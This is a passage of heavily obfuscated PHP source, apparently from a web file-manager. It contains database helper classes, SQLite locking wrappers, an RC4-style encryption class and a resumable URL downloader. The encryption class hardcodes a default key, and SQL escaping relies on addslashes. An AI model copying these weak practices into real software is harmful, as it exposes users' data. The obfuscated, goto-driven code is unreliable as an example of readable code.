ßš¯Ø[$D‹ÓÆ…‡¬À] = current($fàÁ±êæª); } return $FË ßš¯Ø; } protected function parseLimit($bèÑƒ„Œºç) { $C÷Íâ•±†‡ =& $_SERVER[Ö¹ñÒÁ²÷]; $d½Ûöæ¹ = $C÷Íâ•±†‡[33]; if (!empty($bèÑƒ„Œºç)) { switch ($this->dbType) { case $C÷Íâ•±†‡[852]: case $C÷Íâ•±†‡[844]: $bèÑƒ„Œºç = explode($C÷Íâ•±†‡[47], $bèÑƒ„Œºç); if (count($bèÑƒ„Œºç) > 1) { $d½Ûöæ¹ .= $C÷Íâ•±†‡[48] . $bèÑƒ„Œºç[1] . $C÷Íâ•±†‡[49] . $bèÑƒ„Œºç[0] . $C÷Íâ•±†‡[50]; } else { $d½Ûöæ¹ .= $C÷Íâ•±†‡[48] . $bèÑƒ„Œºç[0] . $C÷Íâ•±†‡[50]; } break; case $C÷Íâ•±†‡[825]: case $C÷Íâ•±†‡[843]: break; case $C÷Íâ•±†‡[827]: break; case $C÷Íâ•±†‡[826]: case $C÷Íâ•±†‡[828]: break; case $C÷Íâ•±†‡[855]: default: $d½Ûöæ¹ .= $C÷Íâ•±†‡[48] . $bèÑƒ„Œºç . $C÷Íâ•±†‡[50]; } } return $d½Ûöæ¹; } public function parseKey(&$DÔµùÖ‹ïù, $CéÒ¥éê”´ = true) { $a–æĞ¡’øô =& $_SERVER[Ö¹ñÒÁ²÷]; if ($CéÒ¥éê”´) { $DÔµùÖ‹ïù = $this->parseKeyCheck($DÔµùÖ‹ïù); } if ($this->dbType == $a–æĞ¡’øô[855]) { if ($DÔµùÖ‹ïù != $a–æĞ¡’øô[172] && !preg_match($a–æĞ¡’øô[819], $DÔµùÖ‹ïù)) { $DÔµùÖ‹ïù = $a–æĞ¡’øô[820] . trim($DÔµùÖ‹ïù, $a–æĞ¡’øô[820]) . $a–æĞ¡’øô[820]; } return $DÔµùÖ‹ïù; } else { return parent::parseKey($DÔµùÖ‹ïù); } } public function close() { $this->_linkID = null; } public function error() { $eÉ¢‘•Ü³Ô =& $_SERVER[Ö¹ñÒÁ²÷]; if ($this->PDOStatement) { $Dà°¨Ä„•í = $this->PDOStatement->errorInfo(); $this->error = $Dà°¨Ä„•í[1] . $eÉ¢‘•Ü³Ô[4] . $Dà°¨Ä„•í[2]; } else { $this->error = $eÉ¢‘•Ü³Ô[33]; } if ($eÉ¢‘•Ü³Ô[33] != $this->queryStr) { $this->error .= LNG($eÉ¢‘•Ü³Ô[45]) . $this->queryStr; } think_trace($this->error, $eÉ¢‘•Ü³Ô[33], $eÉ¢‘•Ü³Ô[46]); return $this->error; } public function escapeString($aÑ˜Ş‡‰ÇÍ) { $E©¡ÚÛä§± =& $_SERVER[Ö¹ñÒÁ²÷]; switch ($this->dbType) { case $E©¡ÚÛä§±[852]: case $E©¡ÚÛä§±[825]: case $E©¡ÚÛä§±[843]: case $E©¡ÚÛä§±[855]: return addslashes($aÑ˜Ş‡‰ÇÍ); case $E©¡ÚÛä§±[827]: case $E©¡ÚÛä§±[844]: case $E©¡ÚÛä§±[826]: case $E©¡ÚÛä§±[828]: return str_ireplace($E©¡ÚÛä§±[55], $E©¡ÚÛä§±[56], $aÑ˜Ş‡‰ÇÍ); } } protected function parseValue($A’ğÑ†Áğ) { $D¥ßÂÚ¦Ô =& $_SERVER[Ö¹ñÒÁ²÷]; if (is_string($A’ğÑ†Áğ)) { $A’ğÑ†Áğ = strpos($A’ğÑ†Áğ, $D¥ßÂÚ¦Ô[4]) === 0 ? $this->escapeString($A’ğÑ†Áğ) : $D¥ßÂÚ¦Ô[865] . $this->escapeString($A’ğÑ†Áğ) . $D¥ßÂÚ¦Ô[865]; } elseif (isset($A’ğÑ†Áğ[0]) && is_string($A’ğÑ†Áğ[0]) && strtolower($A’ğÑ†Áğ[0]) == $D¥ßÂÚ¦Ô[281]) { $A’ğÑ†Áğ = $this->escapeString($A’ğÑ†Áğ[1]); } elseif (is_array($A’ğÑ†Áğ)) { $A’ğÑ†Áğ = array_map(array($this, $D¥ßÂÚ¦Ô[866]), $A’ğÑ†Áğ); } elseif (is_bool($A’ğÑ†Áğ)) { $A’ğÑ†Áğ = $A’ğÑ†Áğ ? $D¥ßÂÚ¦Ô[83] : $D¥ßÂÚ¦Ô[464]; } elseif (is_null($A’ğÑ†Áğ)) { $A’ğÑ†Áğ = $D¥ßÂÚ¦Ô[99]; } return $A’ğÑ†Áğ; } public function getLastInsertId() { $a˜åòÅìá“ =& $_SERVER[Ö¹ñÒÁ²÷]; switch ($this->dbType) { case $a˜åòÅìá“[852]: case $a˜åòÅìá“[844]: case $a˜åòÅìá“[825]: case $a˜åòÅìá“[843]: case $a˜åòÅìá“[827]: case $a˜åòÅìá“[855]: return $this->_linkID->lastInsertId(); case $a˜åòÅìá“[826]: case $a˜åòÅìá“[828]: $CŒœØƒÙ‰ = $this->table; $B´‹ˆ‘ = $this->query("\x53\x45\114\105\103\124\x20{$CŒœØƒÙ‰}\56\143\165\x72\162\x76\141\x6c\x20\143\x75\x72\162\x76\141\x6c\40\106\x52\117\115\x20\144\x75\141\154"); return $B´‹ˆ‘ ? $B´‹ˆ‘[0][$a˜åòÅìá“[867]] : 0; } } } class DbSqlite extends DbSqliteBase { public function query($FÀŠ‹ø«Ò”) { goto c‚£¾ë÷’¢; c‚£¾ë÷’¢: $BÈƒ¤©å =& $_SERVER[Ö¹ñÒÁ²÷]; $FˆÃ¦§»‚Ú = DATA_PATH . $BÈƒ¤©å[868]; $FÄî“ä¢Û = fopen($FˆÃ¦§»‚Ú, $BÈƒ¤©å[869]); goto e“å¬½ÃÃÑ; c£Å¿¼œøî: fclose($FÄî“ä¢Û); show_json($BÈƒ¤©å[870], !1); return !1; goto Fé³ÉòŠõ; e“å¬½ÃÃÑ: if (!$FÄî“ä¢Û) { return !1; } if (flock($FÄî“ä¢Û, LOCK_EX)) { $f” Ğ £§ë = parent::query($FÀŠ‹ø«Ò”); flock($FÄî“ä¢Û, LOCK_UN); fclose($FÄî“ä¢Û); return $f” Ğ £§ë; } flock($FÄî“ä¢Û, LOCK_UN); goto c£Å¿¼œøî; Fé³ÉòŠõ: } public function execute($f ½ô‰ˆ™Ï) { goto AÚ‚Â±­; d”ÀÏªÎˆˆ: if (!$bßˆñ¬«ÖÁ) { return !1; } if (flock($bßˆñ¬«ÖÁ, LOCK_EX)) { $dã ñÔÑ‰ = parent::execute($f ½ô‰ˆ™Ï); flock($bßˆñ¬«ÖÁ, LOCK_UN); fclose($bßˆñ¬«ÖÁ); return $dã ñÔÑ‰; } flock($bßˆñ¬«ÖÁ, LOCK_UN); goto eÂÈÀŒ‡ô; eÂÈÀŒ‡ô: fclose($bßˆñ¬«ÖÁ); show_json($A³ø²Óøõâ[870], !1); return !1; goto F½ŸÛ‡ÚäŒ; AÚ‚Â±­: $A³ø²Óøõâ =& $_SERVER[Ö¹ñÒÁ²÷]; $Eá‚Ÿâ½ôÀ = DATA_PATH . $A³ø²Óøõâ[868]; $bßˆñ¬«ÖÁ = fopen($Eá‚Ÿâ½ôÀ, $A³ø²Óøõâ[869]); goto d”ÀÏªÎˆˆ; F½ŸÛ‡ÚäŒ: } } goto DÏÑ‰”Å§˜; e…×Ë±ŞŸê: class Mcrypt { public static $defaultKey = "\x61\x21\x74\x61\153\x41\x3a\x64\154\x6d\x63\154\x64\105\166\x2c\x65"; public static function encode($c¼äˆÙ‰», $aƒ·ØÈòë› = '', $CÍî­öİ = 0, $Cà¯Šßïè÷ = '') { goto c¥Ò©ùÂ”Ï; D‡¶ˆ»ëÛÀ: $E‚˜â±¹Ê = substr($Cà¯Šßïè÷, -$cµÎ‡Ä§’); $F±“™††æï = $FŸ¦ËŒíï . md5($FŸ¦ËŒíï . $E‚˜â±¹Ê); $cÉƒÉ©ßïó = strlen($F±“™††æï); goto cåÇ§éÎê; eØ³ÃŸß–: $f£¿Šõ³Ü = str_replace(array($F‰À°§ŠŞ[280], $F‰À°§ŠŞ[8], $F‰À°§ŠŞ[903]), array($F‰À°§ŠŞ[408], $F‰À°§ŠŞ[70], $F‰À°§ŠŞ[91]), $f£¿Šõ³Ü); return $f£¿Šõ³Ü; goto Bì§°…½Üõ; D÷‰¶Ûœ«ˆ: $f£¿Šõ³Ü = $F‰À°§ŠŞ[33]; for ($EôŒ¸Ú°ö = $bÂçğ—»éÅ = $FäƒÃÎ‘´ = 0; $FäƒÃÎ‘´ < $c¼ÅéíÁ¦ç; $FäƒÃÎ‘´++) { $EôŒ¸Ú°ö = ($EôŒ¸Ú°ö + 1) % 256; $bÂçğ—»éÅ = ($bÂçğ—»éÅ + $Cä­ÚçÈé¼[$EôŒ¸Ú°ö]) % 256; $A„Óİˆç§Î = $Cä­ÚçÈé¼[$EôŒ¸Ú°ö]; $Cä­ÚçÈé¼[$EôŒ¸Ú°ö] = $Cä­ÚçÈé¼[$bÂçğ—»éÅ]; $Cä­ÚçÈé¼[$bÂçğ—»éÅ] = $A„Óİˆç§Î; $f£¿Šõ³Ü .= chr(ord($c¼äˆÙ‰»[$FäƒÃÎ‘´]) ^ $Cä­ÚçÈé¼[($Cä­ÚçÈé¼[$EôŒ¸Ú°ö] + $Cä­ÚçÈé¼[$bÂçğ—»éÅ]) % 256]); } $f£¿Šõ³Ü = $E‚˜â±¹Ê . str_replace($F‰À°§ŠŞ[903], $F‰À°§ŠŞ[33], base64_encode($f£¿Šõ³Ü)); goto eØ³ÃŸß–; c¥Ò©ùÂ”Ï: $F‰À°§ŠŞ =& $_SERVER[Ö¹ñÒÁ²÷]; $cµÎ‡Ä§’ = 4; $aƒ·ØÈòë› = md5($aƒ·ØÈòë› ? $aƒ·ØÈòë› : self::$defaultKey); goto bÔ¾øÜèÙ´; cåÇ§éÎê: $c¼äˆÙ‰» = sprintf($F‰À°§ŠŞ[1906], $CÍî­öİ ? $CÍî­öİ + time() : 0) . substr(md5($c¼äˆÙ‰» . $bÉ““Ë¯‘‰), 0, 16) . $c¼äˆÙ‰»; $c¼ÅéíÁ¦ç = strlen($c¼äˆÙ‰»); $dÇ¢¸»×È = array(); goto E³ù¥È·Øí; E³ù¥È·Øí: for ($FäƒÃÎ‘´ = 0; $FäƒÃÎ‘´ <= 255; $FäƒÃÎ‘´++) { $dÇ¢¸»×È[$FäƒÃÎ‘´] = ord($F±“™††æï[$FäƒÃÎ‘´ % $cÉƒÉ©ßïó]); } $Cä­ÚçÈé¼ = range(0, 255); for ($bÂçğ—»éÅ = $FäƒÃÎ‘´ = 0; $FäƒÃÎ‘´ < 256; $FäƒÃÎ‘´++) { $bÂçğ—»éÅ = ($bÂçğ—»éÅ + $Cä­ÚçÈé¼[$FäƒÃÎ‘´] + $dÇ¢¸»×È[$FäƒÃÎ‘´]) % 256; $A„Óİˆç§Î = $Cä­ÚçÈé¼[$FäƒÃÎ‘´]; $Cä­ÚçÈé¼[$FäƒÃÎ‘´] = $Cä­ÚçÈé¼[$bÂçğ—»éÅ]; $Cä­ÚçÈé¼[$bÂçğ—»éÅ] = $A„Óİˆç§Î; } goto D÷‰¶Ûœ«ˆ; bÔ¾øÜèÙ´: $FŸ¦ËŒíï = md5(substr($aƒ·ØÈòë›, 0, 16)); $bÉ““Ë¯‘‰ = md5(substr($aƒ·ØÈòë›, 16, 16)); $Cà¯Šßïè÷ = $Cà¯Šßïè÷ ? $Cà¯Šßïè÷ : md5(microtime()); goto D‡¶ˆ»ëÛÀ; Bì§°…½Üõ: } public static function decode($Bº‚¢ñŒÛ, $Fíö˜äÒ = '') { goto b•óÄ¦³ÏË; C á¦«àäã: $Fíö˜äÒ = md5($Fíö˜äÒ ? $Fíö˜äÒ : self::$defaultKey); $AÛø‹ˆƒ§§ = md5(substr($Fíö˜äÒ, 0, 16)); $dóÕ¹¿øòä = md5(substr($Fíö˜äÒ, 16, 16)); goto CÆÎ·îÍÁÀ; CÆÎ·îÍÁÀ: $fè…‚„ã¼Æ = substr($Bº‚¢ñŒÛ, 0, $B³‰µå¯¿Ó); $FŠ‡àøÄ— = $AÛø‹ˆƒ§§ . md5($AÛø‹ˆƒ§§ . $fè…‚„ã¼Æ); $fº„‡¢ĞòÈ = strlen($FŠ‡àøÄ—); goto cØñ±©‹Ò™; FŒÑ²Ä¶£±: $eÊ½ëŒÄì = $AË™éË’¾[33]; for ($b¿çºÓç¯Æ = $dğ—›Éå¸ = $EØñ¾æÈ»Ñ = 0; $EØñ¾æÈ»Ñ < $DÖÖ‡»š¢; $EØñ¾æÈ»Ñ++) { $b¿çºÓç¯Æ = ($b¿çºÓç¯Æ + 1) % 256; $dğ—›Éå¸ = ($dğ—›Éå¸ + $f«†”ËÆ ×[$b¿çºÓç¯Æ]) % 256; $F‘Ò¡¥’¿” = $f«†”ËÆ ×[$b¿çºÓç¯Æ]; $f«†”ËÆ ×[$b¿çºÓç¯Æ] = $f«†”ËÆ ×[$dğ—›Éå¸]; $f«†”ËÆ ×[$dğ—›Éå¸] = $F‘Ò¡¥’¿”; $eÊ½ëŒÄì .= chr(ord($Bº‚¢ñŒÛ[$EØñ¾æÈ»Ñ]) ^ $f«†”ËÆ ×[($f«†”ËÆ ×[$b¿çºÓç¯Æ] + $f«†”ËÆ ×[$dğ—›Éå¸]) % 256]); } $b÷²Ä–®­ = intval(substr($eÊ½ëŒÄì, 0, 10)); goto BÚñ«èŒ; BÚñ«èŒ: if (($b÷²Ä–®­ == 0 || $b÷²Ä–®­ - time() > 0) && substr($eÊ½ëŒÄì, 10, 16) == substr(md5(substr($eÊ½ëŒÄì, 26) . $dóÕ¹¿øòä), 0, 16)) { return substr($eÊ½ëŒÄì, 26); } else { return $AË™éË’¾[33]; } goto BÎÒ¤£Ô·; cØñ±©‹Ò™: $Bº‚¢ñŒÛ = base64_decode(substr($Bº‚¢ñŒÛ, $B³‰µå¯¿Ó)); $DÖÖ‡»š¢ = strlen($Bº‚¢ñŒÛ); $Eïªã â•¹ = array(); goto c‹½ğ”õ™„; c‹½ğ”õ™„: for ($EØñ¾æÈ»Ñ = 0; $EØñ¾æÈ»Ñ <= 255; $EØñ¾æÈ»Ñ++) { $Eïªã â•¹[$EØñ¾æÈ»Ñ] = ord($FŠ‡àøÄ—[$EØñ¾æÈ»Ñ % $fº„‡¢ĞòÈ]); } $f«†”ËÆ × = range(0, 255); for ($dğ—›Éå¸ = $EØñ¾æÈ»Ñ = 0; $EØñ¾æÈ»Ñ < 256; $EØñ¾æÈ»Ñ++) { $dğ—›Éå¸ = ($dğ—›Éå¸ + $f«†”ËÆ ×[$EØñ¾æÈ»Ñ] + $Eïªã â•¹[$EØñ¾æÈ»Ñ]) % 256; $F‘Ò¡¥’¿” = $f«†”ËÆ ×[$EØñ¾æÈ»Ñ]; $f«†”ËÆ ×[$EØñ¾æÈ»Ñ] = $f«†”ËÆ ×[$dğ—›Éå¸]; $f«†”ËÆ ×[$dğ—›Éå¸] = $F‘Ò¡¥’¿”; } goto FŒÑ²Ä¶£±; b•óÄ¦³ÏË: $AË™éË’¾ =& $_SERVER[Ö¹ñÒÁ²÷]; $Bº‚¢ñŒÛ = str_replace(array($AË™éË’¾[408], $AË™éË’¾[70], $AË™éË’¾[91]), array($AË™éË’¾[280], $AË™éË’¾[8], $AË™éË’¾[903]), $Bº‚¢ñŒÛ); $B³‰µå¯¿Ó = 4; goto C á¦«àäã; BÎÒ¤£Ô·: } } define($_SERVER[Ö¹ñÒÁ²÷][1907], 1); define($_SERVER[Ö¹ñÒÁ²÷][1908], 2); goto b·êƒ¤Ô›·; E´ƒƒ°á¢ù: class TaskZip extends TaskFileTransfer { protected function startAfter() { $B›Ï ½—ÔÎ =& $_SERVER[Ö¹ñÒÁ²÷]; parent::startAfter(); Hook::bind($B›Ï ½—ÔÎ[1488], array($this, $B›Ï ½—ÔÎ[1483])); $c„›ğæ¸Ú =& $this->task; $c„›ğæ¸Ú[$B›Ï ½—ÔÎ[1485]] = $B›Ï ½—ÔÎ[1034]; if (!$c„›ğæ¸Ú[$B›Ï ½—ÔÎ[1323]]) { $c„›ğæ¸Ú[$B›Ï ½—ÔÎ[1323]] = LNG($B›Ï ½—ÔÎ[1489]); } } protected function endAfter() { $C¥­—Š°è =& $_SERVER[Ö¹ñÒÁ²÷]; parent::endAfter(); Hook::unbind($C¥­—Š°è[1488], array($this, $C¥­—Š°è[1483])); } public function updateAfter() { $FÑÚº°›¿î =& $_SERVER[Ö¹ñÒÁ²÷]; $Cëò¡‘‹ ì =& $this->task; if (!$Cëò¡‘‹ ì[$FÑÚº°›¿î[972]] || !$Cëò¡‘‹ ì[$FÑÚº°›¿î[695]]) { return; } if ($Cëò¡‘‹ ì[$FÑÚº°›¿î[1485]] == $FÑÚº°›¿î[1034]) { $cĞã¢¢¨†™ = $Cëò¡‘‹ ì[$FÑÚº°›¿î[1461]]; if ($Cëò¡‘‹ ì[$FÑÚº°›¿î[1462]] != $FÑÚº°›¿î[1034]) { $cĞã¢¢¨†™ = 0; } $C¸±¢·‹¨‘ = ($Cëò¡‘‹ ì[$FÑÚº°›¿î[1465]] + $cĞã¢¢¨†™) / $Cëò¡‘‹ ì[$FÑÚº°›¿î[695]]; $Cëò¡‘‹ ì[$FÑÚº°›¿î[1416]] = $C¸±¢·‹¨‘ * 0.3; } else { if ($Cëò¡‘‹ ì[$FÑÚº°›¿î[1485]] == $FÑÚº°›¿î[297]) { $C¸±¢·‹¨‘ = $Cëò¡‘‹ ì[$FÑÚº°›¿î[984]] / $Cëò¡‘‹ ì[$FÑÚº°›¿î[972]]; $Cëò¡‘‹ ì[$FÑÚº°›¿î[1416]] = 0.3 + $C¸±¢·‹¨‘ * 0.5; } else { if ($Cëò¡‘‹ ì[$FÑÚº°›¿î[1485]] == $FÑÚº°›¿î[102]) { $C¸±¢·‹¨‘ = 0; if ($Cëò¡‘‹ ì[$FÑÚº°›¿î[1460]]) { $C¸±¢·‹¨‘ = $Cëò¡‘‹ ì[$FÑÚº°›¿î[1461]] / $Cëò¡‘‹ ì[$FÑÚº°›¿î[1460]]; } $Cëò¡‘‹ ì[$FÑÚº°›¿î[1416]] = 0.3 + 0.5 + $C¸±¢·‹¨‘ * 0.2; } } } if ($Cëò¡‘‹ ì[$FÑÚº°›¿î[1416]] > 0) { $DŸ”‘¿‚˜¸ = timeFloat() - $Cëò¡‘‹ ì[$FÑÚº°›¿î[1418]] - $Cëò¡‘‹ ì[$FÑÚº°›¿î[1421]]; $Cëò¡‘‹ ì[$FÑÚº°›¿î[1422]] = $DŸ”‘¿‚˜¸ * (1 - $Cëò¡‘‹ ì[$FÑÚº°›¿î[1416]]) / $Cëò¡‘‹ ì[$FÑÚº°›¿î[1416]]; } } public function copyFileStart($fŒ¨Ñ¼•°, $BÉñÉŒ¥š, $c”¶¿Çä½, $E‚„Ìë§‹ò, $e›´‰ù„Áë, $c»ë¬Â£™î) { $fÈâ÷âë¬ =& $_SERVER[Ö¹ñÒÁ²÷]; parent::copyFileStart($fŒ¨Ñ¼•°, $BÉñÉŒ¥š, $c”¶¿Çä½, $E‚„Ìë§‹ò, $e›´‰ù„Áë, $c»ë¬Â£™î); $bæòÄ¿‡ğõ =& $this->task; if ($bæòÄ¿‡ğõ[$fÈâ÷âë¬[1485]] == $fÈâ÷âë¬[297]) { $bæòÄ¿‡ğõ[$fÈâ÷âë¬[1485]] = $fÈâ÷âë¬[102]; } $this->update(); } public function copyFileEnd($cÜõêª½æ, $Cáß¯·‹½Œ, $B¡ôé‘˜Á×, $b¤¢ÏÚ—º, $Bêƒ§Ş¨Æ, $FÌàÁÅ‹Æ¯) { $e­ö‹¤õÄ =& $_SERVER[Ö¹ñÒÁ²÷]; $BÈê®óÊ…¬ =& $this->task; $BÈê®óÊ…¬[$e­ö‹¤õÄ[1461]] = $BÈê®óÊ…¬[$e­ö‹¤õÄ[1460]]; $BÈê®óÊ…¬[$e­ö‹¤õÄ[1465]] += $BÈê®óÊ…¬[$e­ö‹¤õÄ[1460]]; $BÈê®óÊ…¬[$e­ö‹¤õÄ[1462]] = $e­ö‹¤õÄ[33]; $this->update(); } public function nameParse($BÙŞ‹Áùœê) { $Fùè”œÒñ„ =& $_SERVER[Ö¹ñÒÁ²÷]; $e¿Ñ¶œ£¶¡ =& $this->task; if ($e¿Ñ¶œ£¶¡[$Fùè”œÒñ„[984]] < $e¿Ñ¶œ£¶¡[$Fùè”œÒñ„[972]]) { $eÅ÷ÆÈÁ»† = get_path_this($BÙŞ‹Áùœê); if (strstr($eÅ÷ÆÈÁ»†, $Fùè”œÒñ„[91])) { $e¿Ñ¶œ£¶¡[$Fùè”œÒñ„[984]] += 1; } } if ($e¿Ñ¶œ£¶¡[$Fùè”œÒñ„[1485]] == $Fùè”œÒñ„[1034]) { $e¿Ñ¶œ£¶¡[$Fùè”œÒñ„[1485]] = $Fùè”œÒñ„[297]; } $e¿Ñ¶œ£¶¡[$Fùè”œÒñ„[1458]] = $BÙŞ‹Áùœê; $this->update(); } } class Downloader { static function start($f‹ó¼»Ê®Ï, $AŒãƒô¶óÈ, $c—ÕÙÛ‹ù‚ = 10) { goto CÌéÃİĞÊ; c°®‚ñ¯Ïí: if ($c±Ò«ÑÍÎÅ > $aÅÅŠÖ¼×) { @unlink($C‰‹­Î¶‹…); } file_put_contents($Eğ”¨†«ÉŒ, json_encode($bŠ¬ô„—æ)); $C¦‘‰£½ = self::fileDownloadCurl($f‹ó¼»Ê®Ï, $AŒãƒô¶óÈ, !0, $c±Ò«ÑÍÎÅ, $aÅÅŠÖ¼×); goto b‡ŞÑ©¤; b‡ŞÑ©¤: if ($C¦‘‰£½[$e“ÒÆŠÔ±’[1026]]) { @unlink($Eğ”¨†«ÉŒ); } return $C¦‘‰£½; goto D’ï†–¤ØË; cƒ›³’Ğñ: $C‰‹­Î¶‹… = $AŒãƒô¶óÈ . $e“ÒÆŠÔ±’[1491]; if (is_array($f‹ó¼»Ê®Ï)) { $cÂ¼Ù‰èĞç = $f‹ó¼»Ê®Ï; } else { $cÂ¼Ù‰èĞç = url_header($f‹ó¼»Ê®Ï); } $f‹ó¼»Ê®Ï = $cÂ¼Ù‰èĞç[$e“ÒÆŠÔ±’[291]]; goto F§À…õÀÓô; CÈÓğ„È°’: if (is_file($Eğ”¨†«ÉŒ)) { $e³æ¬õ§‚£ = file_get_contents($Eğ”¨†«ÉŒ); $bŠ¬ô„—æ = json_decode($e³æ¬õ§‚£, 1); } if (file_exists($AŒãƒô¶óÈ) && $aÅÅŠÖ¼× == filesize($AŒãƒô¶óÈ)) { @unlink($C‰‹­Î¶‹…); @unlink($Eğ”¨†«ÉŒ); return array($e“ÒÆŠÔ±’[1026] => !0, $e“ÒÆŠÔ±’[1028] => $e“ÒÆŠÔ±’[1493]); } if ($bŠ¬ô„—æ[$e“ÒÆŠÔ±’[321]] != $aÅÅŠÖ¼×) { $bŠ¬ô„—æ = array($e“ÒÆŠÔ±’[321] => $aÅÅŠÖ¼×); } goto c°®‚ñ¯Ïí; F§À…õÀÓô: if (!$f‹ó¼»Ê®Ï) { return array($e“ÒÆŠÔ±’[1026] => !1, $e“ÒÆŠÔ±’[1028] => $e“ÒÆŠÔ±’[1031]); } if (!$cÂ¼Ù‰èĞç[$e“ÒÆŠÔ±’[1275]] || $cÂ¼Ù‰èĞç[$e“ÒÆŠÔ±’[321]] == 0) { @unlink($C‰‹­Î¶‹…); @unlink($AŒãƒô¶óÈ); $C¦‘‰£½ = self::fileDownloadFopen($f‹ó¼»Ê®Ï, $AŒãƒô¶óÈ, $cÂ¼Ù‰èĞç[$e“ÒÆŠÔ±’[321]]); if ($C¦‘‰£½[$e“ÒÆŠÔ±’[1026]]) { return $C¦‘‰£½; } else { @unlink($C‰‹­Î¶‹…); @unlink($AŒãƒô¶óÈ); $C¦‘‰£½ = self::fileDownloadCurl($f‹ó¼»Ê®Ï, $AŒãƒô¶óÈ, !1, 0, $cÂ¼Ù‰èĞç[$e“ÒÆŠÔ±’[321]]); @unlink($C‰‹­Î¶‹…); return $C¦‘‰£½; } } $c±Ò«ÑÍÎÅ = is_file($C‰‹­Î¶‹…) ? filesize($C‰‹­Î¶‹…) : 0; goto eÓèá®Šæá; eÓèá®Šæá: $aÅÅŠÖ¼× = intval($cÂ¼Ù‰èĞç[$e“ÒÆŠÔ±’[321]]); if (file_exists($C‰‹­Î¶‹…) && time() - filemtime($C‰‹­Î¶‹…) < 3) { return array($e“ÒÆŠÔ±’[1026] => !1, $e“ÒÆŠÔ±’[1028] => $e“ÒÆŠÔ±’[1492]); } $bŠ¬ô„—æ = array(); goto CÈÓğ„È°’; CÌéÃİĞÊ: $e“ÒÆŠÔ±’ =& $_SERVER[Ö¹ñÒÁ²÷]; if (!request_url_safe($f‹ó¼»Ê®Ï)) { return array($e“ÒÆŠÔ±’[1026] => !1, $e“ÒÆŠÔ±’[1028] => $e“ÒÆŠÔ±’[1031]); } $Eğ”¨†«ÉŒ = $AŒãƒô¶óÈ . $e“ÒÆŠÔ±’[1490]; goto cƒ›³’Ğñ; D’ï†–¤ØË: } static function fileDownloadFopen($Eäôâ¸©Œ›, $d„·Ûğ‡, $FåÃ»×¯Îµ = 0) { $E•‰ÉÉ¶á— =& $_SERVER[Ö¹ñÒÁ²÷]; @ini_set($E•‰ÉÉ¶á—[1494], $E•‰ÉÉ¶á—[1495]); $eÔïÖæ÷¡ğ = $d„·Ûğ‡ . $E•‰ÉÉ¶á—[1491]; set_timeout(); @unlink($eÔïÖæ÷¡ğ); if ($c¥Úàï¢ö = @fopen($Eäôâ¸©Œ›, $E•‰ÉÉ¶á—[1496])) { goto bßñƒ£Ë”; côÀ˜„öèÓ: return array($E•‰ÉÉ¶á—[1026] => !0, $E•‰ÉÉ¶á—[1028] => $E•‰ÉÉ¶á—[693]); goto eÁ¨Ôæ—ÚÛ; bßñƒ£Ë”: if (!($a‘É¶ÛÌ²ã = @fopen($eÔïÖæ÷¡ğ, $E•‰ÉÉ¶á—[1497]))) { return array($E•‰ÉÉ¶á—[1026] => !1, $E•‰ÉÉ¶á—[1028] => $E•‰ÉÉ¶á—[1498]); } while (!feof($c¥Úàï¢ö)) { if (!file_exists($eÔïÖæ÷¡ğ)) { fclose($a‘É¶ÛÌ²ã); return array($E•‰ÉÉ¶á—[1026] => !1, $E•‰ÉÉ¶á—[1028] => $E•‰ÉÉ¶á—[1499]); } clearstatcache(); if ($FåÃ»×¯Îµ > 0 && $FåÃ»×¯Îµ == filesize(iconv_system($eÔïÖæ÷¡ğ))) { break; } fwrite($a‘É¶ÛÌ²ã, fread($c¥Úàï¢ö, 1024 * 8), 1024 * 8); } fclose($a‘É¶ÛÌ²ã); goto f‰é£Å·¼ù; f‰é£Å·¼ù: fclose($c¥Úàï¢ö); self::checkGzip($eÔïÖæ÷¡ğ); if (!@rename($eÔïÖæ÷¡ğ, $d„·Ûğ‡)) { usleep(round(rand(0, 1000) * 50)); @unlink($d„·Ûğ‡); $bä³ºÁ¥Ã¹ = @rename($eÔïÖæ÷¡ğ, $d„·Ûğ‡); if (!$bä³ºÁ¥Ã¹) { return array($E•‰ÉÉ¶á—[1026] => !1, $E•‰ÉÉ¶á—[1028] => $E•‰ÉÉ¶á—[1500]); } } goto côÀ˜„öèÓ; eÁ¨Ôæ—ÚÛ: } else { return array($E•‰ÉÉ¶á—[1026] => !1, $E•‰ÉÉ¶á—[1028] => $E•‰ÉÉ¶á—[1501]); } } static function fileDownloadCurl($EªŸ¶Üˆ¯, $bà·ÒßªâÖ, $a¤ÑÚóÂ… = false, $a÷¾Ÿâ‚° = 0, $B±Á­ßÒá‹ = 0) { goto dßÎ‰”æğ; Cì£ ¸ˆºÁ: if ($CƒõË„„¢˜ < $B±Á­ßÒá‹ && $B±Á­ßÒá‹ != 0) { return array($CØ‰îÊ‹áã[1026] => !1, $CØ‰îÊ‹áã[1028] => $CØ‰îÊ‹áã[1492]); } if ($c„†µµï÷ && filesize($fóà‚ôÊ©) != 0) { self::checkGzip($fóà‚ôÊ©); if (!@rename($fóà‚ôÊ©, $bà·ÒßªâÖ)) { @unlink($bà·ÒßªâÖ); $c„†µµï÷ = @rename($fóà‚ôÊ©, $bà·ÒßªâÖ); if (!$c„†µµï÷) { return array($CØ‰îÊ‹áã[1026] => !1, $CØ‰îÊ‹áã[1028] => $CØ‰îÊ‹áã[1504]); } } return array($CØ‰îÊ‹áã[1026] => !0, $CØ‰îÊ‹áã[1028] => $CØ‰îÊ‹áã[693]); } return array($CØ‰îÊ‹áã[1026] => !1, $CØ‰îÊ‹áã[1028] => $CØ‰îÊ‹áã[1505]); goto eŠé…¸±Å²; bõİæËƒ›: $a‹ ŞÜ†×Å = @fopen($fóà‚ôÊ©, $CØ‰îÊ‹áã[976]); if (!$a‹ ŞÜ†×Å) { return array($CØ‰îÊ‹áã[1026] => !1, $CØ‰îÊ‹áã[1028] => $CØ‰îÊ‹áã[1502]); } $bâùâ˜Æ‚ƒ = curl_init($EªŸ¶Üˆ¯); goto eêÙ…¦œñß; DáËæÕ®†ğ: curl_setopt($bâùâ˜Æ‚ƒ, CURLOPT_USERAGENT, $CØ‰îÊ‹áã[1495]); $c„†µµï÷ = curl_exec($bâùâ˜Æ‚ƒ); curl_progress_end($bâùâ˜Æ‚ƒ); goto AÈÚİòÌé; eêÙ…¦œñß: if ($a¤ÑÚóÂ…) { curl_setopt($bâùâ˜Æ‚ƒ, CURLOPT_RANGE, $a÷¾Ÿâ‚° . $CØ‰îÊ‹áã[711]); } curl_setopt($bâùâ˜Æ‚ƒ, CURLOPT_FILE, $a‹ ŞÜ†×Å); curl_setopt($bâùâ˜Æ‚ƒ, CURLOPT_REFERER, get_url_link($EªŸ¶Üˆ¯)); goto BŞÑ»ã‘‰¦; dßÎ‰”æğ: 